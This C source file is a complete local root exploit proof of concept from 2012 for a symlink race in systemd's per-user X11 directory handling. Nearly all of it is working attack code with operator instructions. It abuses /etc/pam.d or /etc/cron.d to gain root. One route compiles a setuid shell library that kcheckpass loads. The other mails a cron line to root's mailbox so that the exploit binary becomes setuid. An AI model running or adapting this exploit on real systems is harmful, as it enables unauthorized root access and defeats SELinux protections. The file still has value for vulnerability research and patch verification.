/* systemd local root exploit PoC, creating /etc/pam.d/display symlink
 * and utilizing kcheckpass to get rootshell via this pam.d entry
 *
 * (C) 2012 Sebastian Krahmer
 *
 * Logout from X11, log into console or ssh, run this program and
 * follow instructions.
 *
 * We exploit the following loop, which creates symlinks inside user
 * owned directory:
 *
 *      mkdir_parents(t, 0755);
 *
 *      if (link(f, t) < 0) {
 *              if (errno == EEXIST) {
 *                      unlink(t);
 *
 *                      if (link(f, t) >= 0)
 *                              goto done;
 *              }
 *
 *              if (symlink(f, t) < 0) {
 *
 *                      if (errno == EEXIST) {
 *                              unlink(t);
 *
 *                              if (symlink(f, t) >= 0)
 *                                      goto done;
 *                      }
 *
 *                      log_error("Failed to link %s to %s: %m", f, t);
 *                      free(f);
 *                      free(t);
 *                      return -errno;
 *              }
 *      }
 *
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <sched.h>


struct {
	int race, kcheckpass;
	char *tdir, *realpath;
} config;


void die(const char *p)
{
	perror(p);
	exit(errno);
}


// check whether /etc and /tmp are different FS's
int need_race()
{
	struct stat st1, st2;

	if (stat("/tmp", &st1) < 0 || stat("/etc", &st2) < 0)
		die("[-] stat");

	return st1.st_dev == st2.st_dev;
}


int sendmail()
{
	struct sockaddr_in sin;
	FILE *f = NULL;
	char buf[1024];
	int sfd;
	struct stat st;

	printf("[*] Dropping cronjob into mail (w00t!)...\n");

	if (stat("/usr/bin/mail", &st) == 0) {
		if ((f = popen("/usr/bin/mail -s dampframme root", "w")) == NULL)
			die("[-] popen");
		fprintf(f, "* * * * * root %s\n.\n", config.realpath);
		fclose(f);
		printf("[+] Done.\n");
		return 0;
	}

	if ((sfd = socket(PF_INET, SOCK_STREAM, 0)) < 0)
		die("[-] socket");
	memset(&sin, 0, sizeof(sin));
	sin.sin_port = htons(25);
	sin.sin_family = AF_INET;
	if (connect(sfd, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		die("[-] connect");
	if ((f = fdopen(sfd, "r+")) == NULL)
		die("[-] fdopen");
	fgets(buf, sizeof(buf), f); printf("[*] %s", buf);
	fprintf(f, "HELO dampframme\n");
	fgets(buf, sizeof(buf), f); printf("[*] %s", buf);
	fprintf(f, "MAIL FROM: <rost@dampframme>\n");
	fgets(buf, sizeof(buf), f); printf("[*] %s", buf);
	fprintf(f, "RCPT TO: <root@localhost>\n");
	fgets(buf, sizeof(buf), f); printf("[*] %s", buf);
	fprintf(f, "DATA\n");
	fgets(buf, sizeof(buf), f); printf("[*] %s", buf);
	fprintf(f, "* * * * * root %s\n.\n", config.realpath);
	fgets(buf, sizeof(buf), f); printf("[*] %s", buf);
	fprintf(f, "QUIT\n");
	fgets(buf, sizeof(buf), f); printf("[*] %s", buf);
	fclose(f);
	printf("[+] Done.\n");
	return 0;
}


// Change the display name to your needs.
// This function sits and waits until Ctrl+Alt+Backspace
// forced Xorg process to remove the display socket, so
// we can re-create it
int remove_x11(const char *x)
{
	char x11disp[256];
	FILE *f = NULL;

	snprintf(x11disp, sizeof(x11disp), "/tmp/.X11-unix/%s", x);

	for (;;) {
		if (mkdir(x11disp, 0700) == 0)
			break;
	}

	printf("[*] waiting ...\n");
	// Hopefully 3 seconds is enough
	sleep(3);

	rmdir(x11disp);

	if (config.kcheckpass) {
		if ((f = fopen(x11disp, "w")) == NULL)
			die("[-] fopen");
		fprintf(f, "auth\trequired\t/tmp/boom.so\n");
		fclose(f);
	} else {
		symlink("/var/mail/root", x11disp);
	}
	return 0;
}


int drop_boomsh()
{
	FILE *f = NULL;

	printf("[*] Dropping boomsh DSO ...\n");
	if ((f = fopen("/tmp/boom.c", "w")) == NULL) 
		die("[-] fopen");
	fprintf(f, "#include <stdio.h>\n#include <unistd.h>\n"
	           "void __attribute__((constructor)) init() {\n"
	           "char *a[] = {\"/bin/sh\", (void *)0};\n"
	           "setuid(0);\n"
		   "execve(*a, a, NULL);\n}\n");
	fclose(f);
	system("gcc -fPIC -c /tmp/boom.c -o /tmp/boom.o; gcc -shared -o /tmp/boom.so /tmp/boom.o");
	printf("[+] Done.\n");
	return 0;
}

// I tried it with inotify, but it was more successful
// to rely on multicore real parallelism
int trick_systemd()
{
	char path[1024], path2[1024], npath[1024], npath2[1024];
	struct stat st;
	const char *user = getenv("USER");

	snprintf(path, sizeof(path), "/run/user/%s/X11", user);
	snprintf(npath, sizeof(npath), "/run/user/%s/x.%d", user, getpid());
	snprintf(path2, sizeof(path2), "/run/user/%s", user);
	snprintf(npath2, sizeof(npath2), "%s.2", npath);

	rename(path, npath);

	if (!config.race) {
		if (symlink(config.tdir, path) < 0)
			die("[-] symlink");
		return 0;
	}

	umask(0);

	mkdir(path, 0755);
	chdir(path2);
	symlink(config.tdir, "x");

	close(creat("X11/display", 0400));

	if (fork() == 0) {
		for (;;) {
			if (syscall(SYS_rename, "x", "X11") == 0)
				break;
			if (errno == ENOENT)
				break;
		}
		exit(0);
	} else {
		for (;;) {
			if (syscall(SYS_symlink, "/", "X11/display") == 0)
				break;
			if (errno == ENOENT)
				break;
		}
	}

	for (;;) {
		if (syscall(SYS_rmdir, "X11") == 0 || errno == ENOENT)
			break;
	}
	syscall(SYS_rename, "x", "X11");
	sleep(3);
	rename(path, npath2);

	snprintf(path, sizeof(path), "%s/display", config.tdir);
	if (stat(path, &st) < 0)
		return -1;

	return 0;
}


void setup_config()
{
	struct stat st;
	char buf[1024];

	printf("[*] setting up config...\n");
	config.kcheckpass = (stat("/usr/lib64/kde4/libexec/kcheckpass", &st) == 0);
	config.race = need_race();

	memset(buf, 0, sizeof(buf));
	if (readlink("/proc/self/exe", buf, sizeof(buf)) < 0)
		die("[-] readlink");
	config.realpath = strdup(buf);

	if (config.kcheckpass)
		config.tdir = "/etc/pam.d";
	else
		config.tdir = "/etc/cron.d";
	printf("[+] Done.\n");

	if (config.race) {
		printf("[*] Need race.\n");
	} else {
		printf("[*] No race needed.\n");
	}
}


int main(int argc, char **argv)
{
	char *kcp[] = {"/usr/lib64/kde4/libexec/kcheckpass", "-c", "display", "-m", "classic", NULL};
	char *sh[] = {"/bin/sh", NULL};
	char *x11 = "X0";
	struct stat st;

	if (geteuid() == 0 && getuid()) {
		setuid(0);
		execve(*sh, sh, NULL);
		die("[-] execve");
	}

	if (argc > 1)
		x11 = argv[1];

	printf("[**] Dampframme, systemd SELinux bypassing local root exploit!\n");
	printf("[**] Take care to use the right X display\n");
	printf("[**] (pass as argv[1] (X1, X2, ...) if not X0)\n\n");
	printf("[*] Checking the need for race exploit ...\n");

	setup_config();

	if (getuid() == 0) {
		chown(config.realpath, 0, 0);
		chmod(config.realpath, 04755);
		return 0;
	}

	if (config.kcheckpass) {
		printf("[*] Using kcheckpass helper.\n");
		drop_boomsh();
	} else {
		printf("[*] Using crond helper.\n");
		sendmail();
	}

	printf("[*] Login on X11 display NOW!\n");

	if (trick_systemd() < 0) {
		printf("[-] Failed; logout from X11 and restart procedure.\n");
		exit(1);
	}

	printf("[+] Press Ctrl+Alt+Backspace on the X11 desktop NOW, to force X11 restart!\n");
	remove_x11(x11);
	printf("[+] Success!\n");

	if (config.kcheckpass) {
		printf("[*] Invoking rootshell via kcheckpass helper.\n");
		execve(*kcp, kcp, NULL);
		die("[-] execve");
	}

	printf("[*] Waiting for crond schedule to become mode 04755.\n");
	printf("[*] This can take a while ...\n");

	for (;;) {
		stat(config.realpath, &st);
		if ((st.st_mode & 04000) == 04000)
			break;
		sleep(1);
	}
	printf("[+] Dampframme vs SELinux 1:0!\n");
	*sh = config.realpath;
	execve(*sh, sh, NULL);
	die("[-] execve");
	return 0;
}

